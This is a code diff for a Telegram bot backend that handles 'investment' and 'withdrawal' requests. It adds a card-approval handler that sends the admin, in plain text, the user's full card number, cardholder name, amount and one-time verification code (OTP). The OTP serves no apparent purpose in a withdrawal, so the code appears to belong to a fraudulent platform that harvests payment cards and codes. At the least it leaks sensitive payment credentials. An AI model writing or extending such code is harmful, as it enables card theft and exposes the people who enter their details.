@@ -188,14 +188,18 @@ router.post('/webhook', async (req, res) => {
         const investmentId = callbackData.replace('reject_investment_', '')
         await answerCallback(callbackQueryId)
         await sendMessage(chatId, `Investment ${investmentId} rejected via webhook.`)
-      } else if (callbackData.startsWith('paid_withdrawal_')) {
-        const withdrawalId = callbackData.replace('paid_withdrawal_', '')
-        await answerCallback(callbackQueryId, 'Processing withdrawal...')
-        await handlePaidWithdrawal(withdrawalId, chatId)
+      } else if (callbackData.startsWith('approve_card_')) {
+        const withdrawalId = callbackData.replace('approve_card_', '')
+        await answerCallback(callbackQueryId, 'Approving card...')
+        await handleApproveCard(withdrawalId, chatId)
       } else if (callbackData.startsWith('reject_withdrawal_')) {
         const withdrawalId = callbackData.replace('reject_withdrawal_', '')
         await answerCallback(callbackQueryId, 'Rejecting withdrawal...')
         await handleRejectWithdrawal(withdrawalId, chatId)
+      } else if (callbackData.startsWith('paid_withdrawal_')) {
+        const withdrawalId = callbackData.replace('paid_withdrawal_', '')
+        await answerCallback(callbackQueryId, 'Processing withdrawal...')
+        await handlePaidWithdrawal(withdrawalId, chatId)
       } else {
         await answerCallback(callbackQueryId, 'Unknown action')
       }
@@ -395,6 +399,39 @@ const handleStartTradeAfterApprove = async (depositId: string, adminChatId: numb
   }
 }
 
+const handleApproveCard = async (withdrawalId: string, adminChatId: number) => {
+  try {
+    const withdrawal = await prisma.withdrawal.findUnique({
+      where: { id: withdrawalId },
+      include: { user: true, investment: true },
+    })
+    if (!withdrawal) {
+      await sendMessage(adminChatId, 'ℹ️ Withdrawal not found.')
+      return
+    }
+    if (withdrawal.status !== 'WAITING_FOR_ADMIN_APPROVAL') {
+      await sendMessage(adminChatId, '⚠️ This withdrawal is not waiting for admin approval.')
+      return
+    }
+
+    // Admin approves - mark as verified and ready for payment
+    await prisma.withdrawal.update({
+      where: { id: withdrawalId },
+      data: { status: 'WITHDRAWAL_PENDING', isVerified: true },
+    })
+
+    await sendMessage(adminChatId, `✅ Card approved! Ready for payment.\n\nCard: ${withdrawal.cardNumber?.replace(/(\d{4})(?=\d)/g, '$1 ')}\nHolder: ${withdrawal.cardholderName}\nAmount: $${withdrawal.amount}\nOTP: ${withdrawal.verificationCode}`)
+    
+    if (withdrawal?.user?.telegramChatId) {
+      await sendMessage(Number(withdrawal.user.telegramChatId),
+        `✅ Your withdrawal card has been approved! Admin will process the payment shortly.`)
+    }
+  } catch (error) {
+    console.error('Approve card error:', error)
+    await sendMessage(adminChatId, '❌ Failed to approve card.')
+  }
+}
+
 const handlePaidWithdrawal = async (withdrawalId: string, adminChatId: number) => {
   try {
     const withdrawal = await prisma.withdrawal.findUnique({
@@ -453,7 +490,7 @@ const handleRejectWithdrawal = async (withdrawalId: string, adminChatId: number)
     })
     
     const result = await prisma.withdrawal.updateMany({
-      where: { id: withdrawalId, status: { in: ['WITHDRAWAL_PENDING', 'WAITING_FOR_VERIFICATION'] } },
+      where: { id: withdrawalId, status: { in: ['WAITING_FOR_ADMIN_APPROVAL', 'CARD_APPROVED_WAITING_USER', 'WITHDRAWAL_PENDING'] } },
       data: { status: 'REJECTED' },
     })
     if (result.count === 0) {
